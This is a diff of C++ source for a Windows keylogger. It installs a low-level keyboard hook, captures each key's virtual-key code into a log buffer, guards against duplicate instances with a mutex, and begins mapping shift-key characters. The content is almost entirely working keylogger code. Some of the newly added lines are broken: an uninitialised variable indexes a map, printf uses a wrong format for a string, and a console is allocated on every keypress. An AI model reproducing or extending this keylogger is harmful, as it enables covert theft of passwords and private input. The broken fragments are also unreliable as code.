@@ -1,6 +1,12 @@
-#include "keylog.h"
 #include <stdio.h>
 #include <Windows.h>
+#include <map>
+#include <string>
+#include <string_view>
+#include "keylog.h"
+#include "keystate.h"
+
+#pragma warning(disable : 4996)
 
 // global handle to hook
 HHOOK ghHook = NULL;
@@ -23,7 +29,33 @@ LPSTR lpTempBuf = NULL;
 HANDLE hTempBufHasData = NULL;
 HANDLE hTempBufNoData = NULL;
 
-int APIENTRY WinMainW(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPCSTR lpCmdLine, int nCmdShow) {
+LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+// error message handler function
+VOID Fatal(LPCSTR s) {
+#ifdef DEBUG
+    wchar_t err_buf[BUF_SIZ];
+
+    swprintf(err_buf, 50, L"%hs failed: %lu", s, GetLastError());
+    MessageBox(NULL, err_buf, NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
+#endif
+    ExitProcess(1);
+}
+
+// clean up function on exit
+VOID CleanUp(VOID) {
+    if (lpLogBuf && ghLogHeap) {
+        HeapFree(ghLogHeap, 0, lpLogBuf);
+        HeapDestroy(ghLogHeap);
+    }
+    if (ghHook) UnhookWindowsHookEx(ghHook);
+    if (ghMutex) CloseHandle(ghMutex);
+    if (lpTempBuf && ghTempHeap) {
+        HeapFree(ghTempHeap, 0, lpTempBuf);
+        HeapDestroy(ghTempHeap);
+    }
+}
+
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     // mutex to prevent other keylog instances
     ghMutex = CreateMutexW(NULL, TRUE, NAME);
     if (ghMutex == NULL) {
@@ -77,34 +109,19 @@ int APIENTRY WinMainW(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPCSTR lpCmd
     MSG msg;
     while (GetMessage(&msg, 0, 0, 0) != 0) {
         TranslateMessage(&msg);
-        DispatchMessage(&msg);    
+        DispatchMessage(&msg);
     }
 
     UnhookWindowsHookEx(ghHook);
 
     return 0;
 }
-
-// clean up function on exit
-VOID CleanUp(VOID) {
-    if (lpLogBuf && ghLogHeap) {
-        HeapFree(ghLogHeap, 0, lpLogBuf);
-        HeapDestroy(ghLogHeap);
-    }
-    if (ghHook) UnhookWindowsHookEx(ghHook);
-    if (ghMutex) CloseHandle(ghMutex);
-    if (lpTempBuf && ghTempHeap) {
-        HeapFree(ghTempHeap, 0, lpTempBuf);
-        HeapDestroy(ghTempHeap);
-    }
-}
-
 // start of lowlevel keyboard proc part
 // callback function when key is pressed
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     // wParam and lParam have info about keyboard message
     if (nCode == HC_ACTION) {
-        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
+        KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
         // if key is pressed or held
         if (wParam == WM_KEYDOWN) {
             // get string length of log buffer
@@ -113,12 +130,19 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             // copy vkCode into log buffer
             CHAR key[2];
             DWORD vkCode = kbd->vkCode;
-            printf("vkcode is %d",vkCode);
+            BOOL chk = AllocConsole();
+            freopen("CONOUT$", "w", stdout);
+            printf("vkcode is %lu", vkCode);
+
             // key is 0 - 9
-/*          if (vkCode >= 0x30 && vkCode <= 0x39) {
-                // shift key
+            if (vkCode >= 0x30 && vkCode <= 0x39) {
                 if (GetAsyncKeyState(VK_SHIFT)) {
-                    switch (vkCode) {
+                    struct keystate keysmap;
+                    string vkCodeOut = keysmap.shiftKeys[vkCodeOut];
+                    printf("vkcode is %c", vkCodeOut);
+                }
+            }
+                        /*switch (vkCode) {
                         case 0x30:
                             Log(")");
                             break;
@@ -374,15 +398,4 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     }
 
     return CallNextHookEx(0, nCode, wParam, lParam);
-}
-// error message handler function
-VOID Fatal(LPCSTR s) {
-#ifdef DEBUG
-    wchar_t err_buf[BUF_SIZ];
-
-    swprintf(err_buf, 50, L"%s failed: %lu", s, GetLastError());
-    MessageBox(NULL, err_buf, NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
-#endif
-
-    ExitProcess(1);
 }
